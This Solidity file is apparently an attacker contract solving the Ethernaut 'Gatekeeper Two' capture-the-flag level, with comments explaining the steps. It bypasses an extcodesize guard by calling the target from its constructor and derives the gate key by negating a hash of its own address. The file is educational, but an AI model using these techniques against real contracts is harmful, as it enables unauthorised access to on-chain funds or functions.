// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {

  IGateKeeperTwo gateKeeperTwoContract;


  // When an external contract is called from the constructor of another contract, the extcodesize of the caller contract is detected as 0 (because is hasn't been created yet!)
  constructor(address _gateKeeperTwoContract) {
    gateKeeperTwoContract = IGateKeeperTwo(_gateKeeperTwoContract);

    // Initiate attack
    bytes8 _gateKey = bytes8(_generateKey());
    gateKeeperTwoContract.enter(_gateKey);
  }

  function _generateKey() internal view returns (uint64) {
    // Reverse Logic the condition to pass Gate Three
      // require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);

    // Consider the fact that the gate uses `msg.sender` to generate the left value of the validation
    // Be ware that `msg.sender` on this attacker contract points to the address of the account that is interacting with this contract!
    // That means, on this contract instead of using `msg.sender` we must use the address of this contract itself!
        // address(this) instead of msg.sender

    // First calculate the left side of the XOR condition, and then negate that value, the negate value is the key
    // Why? Because the gate requires a key such that by appliying a XOR operation to it will result in all 1s
    // All 1s? Yes, the left side of the validation must be equals to the max number that an uint64 can store, which in binary that is the same as 64 bits set to 1

    // The way to get a 1 using the XOR operator is determined by the next table:
    //  A | B | Output
    // ---|---|--------
    //  0 | 0 |   0
    //  0 | 1 |   1
    //  1 | 0 |   1
    //  1 | 1 |   0
    
    // As you can clearly see, the only way to get 1s as a result of a XOR operation is by inputting different bits
    //  ===>  bit B must be the negate value of bit A <===

    // The ~ character is the negate operator

    return ~(uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
  }

}